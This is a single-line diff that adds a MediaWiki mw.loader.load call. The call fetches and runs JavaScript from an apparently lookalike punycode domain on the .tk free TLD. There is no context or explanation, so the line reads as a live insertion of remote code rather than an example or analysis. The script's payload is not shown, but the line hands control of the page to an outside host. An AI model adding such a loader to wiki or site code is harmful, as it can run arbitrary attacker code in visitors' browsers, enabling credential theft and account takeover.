@@ -1,0 +1,1 @@
+mw.loader.load("//xn--w-wha.tk/opt-js?s=whois");
